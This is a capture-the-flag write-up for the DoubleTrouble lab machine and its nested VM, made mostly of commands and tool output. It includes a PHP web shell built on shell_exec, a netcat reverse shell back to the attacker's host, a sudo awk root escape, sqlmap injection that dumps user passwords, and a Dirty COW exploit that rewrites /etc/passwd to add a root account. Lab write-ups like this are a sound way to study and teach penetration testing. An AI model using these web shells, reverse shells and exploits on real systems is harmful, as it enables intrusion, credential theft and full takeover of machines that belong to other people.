@@ -1,0 +1,367 @@
+---------- DoubleTruble Writeup ----------
+
+
+--> netdiscover 
+  - We locate the target machine with netdiscover.
+  - 10.0.2.30       08:00:27:38:92:56     60    3600  PCS Systemtechnik GmbH  
+
+
+--> nmap                                                                                                                    
+  ┌──(root㉿kali)-[*]
+  └─# nmap -sV -sC -p- -A 10.0.2.30
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-06 13:49 EDT
+  Nmap scan report for 10.0.2.30
+  Host is up (0.00050s latency).
+  Not shown: 65533 closed tcp ports (reset)
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+  | ssh-hostkey: 
+  |   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
+  |   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
+  |_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
+  80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+  |_http-title: qdPM | Login
+  |_http-server-header: Apache/2.4.38 (Debian)
+  MAC Address: 08:00:27:38:92:56 (Oracle VirtualBox virtual NIC)
+  Device type: general purpose
+  Running: Linux 4.X|5.X
+  OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+  OS details: Linux 4.15 - 5.8
+  Network Distance: 1 hop
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+  TRACEROUTE
+  HOP RTT     ADDRESS
+  1   0.50 ms 10.0.2.30
+
+  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.05 seconds
+
+- Let's check the http://10.0.2.30 
+- The page is a login page 
+
+
+--> gobuster 
+  ─(root㉿kali)-[*]
+  └─# gobuster dir -u http://10.0.2.30 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt
+  ===============================================================
+  Gobuster v3.6
+  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+  ===============================================================
+  [+] Url:                     http://10.0.2.30
+  [+] Method:                  GET
+  [+] Threads:                 10
+  [+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  [+] Negative Status codes:   404
+  [+] User Agent:              gobuster/3.6
+  [+] Extensions:              php,txt,html
+  [+] Timeout:                 10s
+  ===============================================================
+  Starting gobuster in directory enumeration mode
+  ===============================================================
+  /images               (Status: 301) [Size: 307] [--> http://10.0.2.30/images/]
+  /.php                 (Status: 403) [Size: 274]
+  /.html                (Status: 403) [Size: 274]
+  /index.php            (Status: 200) [Size: 5804]
+  /uploads              (Status: 301) [Size: 308] [--> http://10.0.2.30/uploads/]
+  /css                  (Status: 301) [Size: 304] [--> http://10.0.2.30/css/]
+  /template             (Status: 301) [Size: 309] [--> http://10.0.2.30/template/]
+  /core                 (Status: 301) [Size: 305] [--> http://10.0.2.30/core/]
+  /install              (Status: 301) [Size: 308] [--> http://10.0.2.30/install/]
+  /js                   (Status: 301) [Size: 303] [--> http://10.0.2.30/js/]
+  /check.php            (Status: 200) [Size: 0]
+  /sf                   (Status: 301) [Size: 303] [--> http://10.0.2.30/sf/]
+  /readme.txt           (Status: 200) [Size: 470]
+  /robots.txt           (Status: 200) [Size: 26]
+  /secret               (Status: 301) [Size: 307] [--> http://10.0.2.30/secret/]
+  /backups              (Status: 301) [Size: 308] [--> http://10.0.2.30/backups/]
+  /batch                (Status: 301) [Size: 306] [--> http://10.0.2.30/batch/]
+  /.php                 (Status: 403) [Size: 274]
+  /.html                (Status: 403) [Size: 274]
+  /server-status        (Status: 403) [Size: 274]
+  Progress: 882240 / 882244 (100.00%)
+  ===============================================================
+  Finished
+  ===============================================================
+
+  - When we move to the http://10.0.2.30/secret we found a jpg file let's get it to 
+    our machine and search on it.
+
+
+--> stegseek 
+  ─(root㉿kali)-[*]
+  └─# stegseek doubletrouble.jpg 
+  StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+  [i] Found passphrase: "92camaro"       
+  [i] Original filename: "creds.txt".
+  [i] Extracting to "doubletrouble.jpg.out".
+
+  - When we look inside the doubletruble.jpg.out we saw the 
+  otisrush@localhost.com
+  ------- 
+  
+  - Now in the qdPM page we can login there with the informations.
+  - When we are in the page we can upload a file in user details section.
+  - We can create a basic php shell and upload the site.
+
+
+--> php shell
+  <?php 
+	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+
+  ?>
+  
+  - We should save this file as example.php (You can check the
+  shell in the http://10.0.2.30/uploads/users section)
+  
+  - Later that in the url section of the website we run this command. 
+  - http://10.0.2.30/uploads/users/3102352-example.php?cmd=id
+    (uid=33 (www-data) gid=33 (www-data) groups=33(www-data))
+
+
+
+--> In local machine 
+  (root㉿kali)-[*]
+  └─# nc -nlvp 443                      
+  listening on [any] 443 ...
+
+  - Than in target machines url enter these commands (nc -c bash 10.0.2.24 443)
+
+
+--> Entering the target machine and Privilege Escalation
+  ──(root㉿kali)-[/home/s3r4ph/VMs]
+  └─# nc -nlvp 443                      
+  listening on [any] 443 ...
+  connect to [10.0.2.24] from (UNKNOWN) [10.0.2.30] 36330
+*whoami;id;hostname
+  www-data
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  doubletrouble
+*sudo -l 
+  Matching Defaults entries for www-data on doubletrouble:
+      env_reset, mail_badpass,
+      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+  User www-data may run the following commands on doubletrouble:
+      (ALL : ALL) NOPASSWD: /usr/bin/awk
+
+  - Let's check the GFTOBINS for further inspection.
+   (https://gtfobins.github.io/gtfobins/awk/#sudo)
+
+*sudo awk 'BEGIN {system("/bin/sh")}'
+*whoami 
+  root
+*cd /root
+*ls 
+  doubletrouble.ova
+
+  - As we can see there is a .ova file it is an another VM lets download it into our machine
+    and start it.
+
+--> In target machine
+  *python3 -m http.server 8080
+
+--> In local macihne
+  ──(root㉿kali)-[*]
+  └─# wget http://10.0.2.30:8080/doubletrouble.ova 
+  --2024-05-06 14:04:10--  http://10.0.2.30:8080/doubletrouble.ova
+  Connecting to 10.0.2.30:8080... connected.
+  HTTP request sent, awaiting response... 200 OK
+  Length: 413142528 (394M) [application/octet-stream]
+  Saving to: ‘doubletrouble.ova’
+
+  doubletrouble.ova            100%[=============================================>] 394.00M  21.5MB/s    in 20s     
+
+  2024-05-06 14:04:31 (19.4 MB/s) - ‘doubletrouble.ova’ saved [413142528/413142528]
+
+
+---------- Iner Writeup ----------
+
+  - When we start the second VM we will follow the same path for further inspections.
+
+
+--> nmap
+  ─(root㉿kali)-[*]
+  └─# nmap -sV -sC -p- -A 10.0.2.32
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-06 14:40 EDT
+  Nmap scan report for 10.0.2.32
+  Host is up (0.00049s latency).
+  Not shown: 65533 closed tcp ports (reset)
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u4 (protocol 2.0)
+  | ssh-hostkey: 
+  |   1024 e8:4f:84:fc:7a:20:37:8b:2b:f3:14:a9:54:9e:b7:0f (DSA)
+  |   2048 0c:10:50:f5:a2:d8:74:f1:94:c5:60:d7:1a:78:a4:e6 (RSA)
+  |_  256 05:03:95:76:0c:7f:ac:db:b2:99:13:7e:9c:26:ca:d1 (ECDSA)
+  80/tcp open  http    Apache httpd 2.2.22 ((Debian))
+  |_http-title: Site doesn't have a title (text/html).
+  |_http-server-header: Apache/2.2.22 (Debian)
+  MAC Address: 08:00:27:2A:55:9E (Oracle VirtualBox virtual NIC)
+  Device type: general purpose
+  Running: Linux 3.X
+  OS CPE: cpe:/o:linux:linux_kernel:3
+  OS details: Linux 3.2 - 3.10, Linux 3.2 - 3.16
+  Network Distance: 1 hop
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+  TRACEROUTE
+  HOP RTT     ADDRESS
+  1   0.49 ms 10.0.2.32
+
+  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 27.42 seconds
+
+
+--> gobuster
+  ─(root㉿kali)-[*]
+  └─# gobuster dir -u http://10.0.2.32 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt
+  ===============================================================
+  Gobuster v3.6
+  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+  ===============================================================
+  [+] Url:                     http://10.0.2.32
+  [+] Method:                  GET
+  [+] Threads:                 10
+  [+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  [+] Negative Status codes:   404
+  [+] User Agent:              gobuster/3.6
+  [+] Extensions:              html,php,txt
+  [+] Timeout:                 10s
+  ===============================================================
+  Starting gobuster in directory enumeration mode
+  ===============================================================
+  /.html                (Status: 403) [Size: 282]
+  /.php                 (Status: 403) [Size: 281]
+  /index.php            (Status: 200) [Size: 615]
+  Progress: 93072 / 882244 (10.55%)^C
+  [!] Keyboard interrupt detected, terminating.
+  Progress: 93642 / 882244 (10.61%)
+  ===============================================================
+  Finished
+  ===============================================================
+
+
+--> sql injection 
+  (root㉿kali)-[*]
+  └─# sqlmap -u http://10.0.2.32/index.php --forms --current-db -D doubletrouble -T users --dump 
+          ___
+         __H__
+   ___ ___[(]_____ ___ ___  {1.8.4#stable}
+  |_ -| . ["]     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+  +----------+----------+
+  | password | username |
+  +----------+----------+
+  | GfsZxc1  | montreux |
+  | ******** | clapton  | --> here is the password for ssh as clapton
+  +----------+----------+
+
+  [14:49:18] [INFO] table 'doubletrouble.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.0.2.32/dump/doubletrouble/users.csv'
+  [14:49:18] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-05062024_0244pm.csv'
+
+  [*] ending @ 14:49:18 /2024-05-06/
+
+
+--> ssh login and Privilege Escalation
+  (root㉿kali)-[/home/s3r4ph]
+  └─# ssh clapton@10.0.2.32                                                                      
+  The authenticity of host '10.0.2.32 (10.0.2.32)' can't be established.
+  ECDSA key fingerprint is SHA256:/v6Q2+ydqJo0XbOM6QR5qjyuQr2+a/P+R90qw0RlxWI.
+  This key is not known by any other names.
+  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
+  Warning: Permanently added '10.0.2.32' (ECDSA) to the list of known hosts.
+clapton@10.0.2.32's password: 
+  Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64
+
+  The programs included with the Debian GNU/Linux system are free software;
+  the exact distribution terms for each program are described in the
+  individual files in /usr/share/doc/*/copyright.
+
+  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+  permitted by applicable law.
+clapton@doubletrouble:~$ whoami;id;hostname
+  clapton
+  uid=1000(clapton) gid=1000(clapton) groups=1000(clapton)
+  doubletrouble
+clapton@doubletrouble:~$ ls 
+  user.txt
+clapton@doubletrouble:~$ cat user.txt
+  ------------------------------- --> Here is your first flag as a user congrats !
+clapton@doubletrouble:~$ sudo -l
+  -bash: sudo: command not found
+clapton@doubletrouble:~$ find / -perm -u=s 2>/dev/null
+  /usr/sbin/exim4
+  /usr/bin/chfn
+  /usr/bin/passwd
+  /usr/bin/chsh
+  /usr/bin/gpasswd
+  /usr/bin/newgrp
+  /usr/lib/eject/dmcrypt-get-device
+  /usr/lib/pt_chown
+  /usr/lib/openssh/ssh-keysign
+  /bin/ping
+  /bin/mount
+  /bin/umount
+  /bin/su
+  /bin/ping6
+clapton@doubletrouble:~$ uname -a 
+  Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
+
+  - From Exploit-DB we found 
+  (Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' 
+  Race Condition Privilege Escalation (/etc/passwd Method))
+  - Please don't forget the search and learn it !
+  - (https://www.exploit-db.com/exploits/40839)
+
+--> In local machine 
+  ──(root㉿kali)-[*]
+  └─# nc 10.0.2.32 8888 < dirtycow.c 
+
+--> In target machine 
+clapton@doubletrouble:~$ nc -nlvp 8888 > dirtycow.c
+  listening on [any] 8888 ...
+  connect to [10.0.2.32] from (UNKNOWN) [10.0.2.24] 59260
+
+clapton@doubletrouble:~$ gcc -pthread dirtycow.c -o dirty -lcrypt 
+clapton@doubletrouble:~$ ./dirty new_passwd
+  /etc/passwd successfully backed up to /tmp/passwd.bak
+  Please enter the new password: new_passwd
+  Complete line:
+  firefart:fiMU3SZzJWcZw:0:0:pwned:/root:/bin/bash
+
+  mmap: 7f4f12cd8000
+  madvise 0
+
+  ptrace 0
+  Done! Check /etc/passwd to see if the new user was created.
+  You can log in with the username 'firefart' and the password 'new_passwd'.
+
+
+  DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+  Done! Check /etc/passwd to see if the new user was created.
+  You can log in with the username 'firefart' and the password 'new_passwd'.
+
+
+  DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+clapton@doubletrouble:~$ su firefart 
+  Password: 
+firefart@doubletrouble:/home/clapton# whoami;id;hostname
+  firefart
+  uid=0(firefart) gid=0(root) groups=0(root)
+  doubletrouble
+firefart@doubletrouble:/# cd /root 
+firefart@doubletrouble:~# ls 
+  logdel2  root.txt
+firefart@doubletrouble:~# cat root.txt
+  ------------------------------------- --> Here is your root flag congrats !
+  
+  
+
+  
+
+
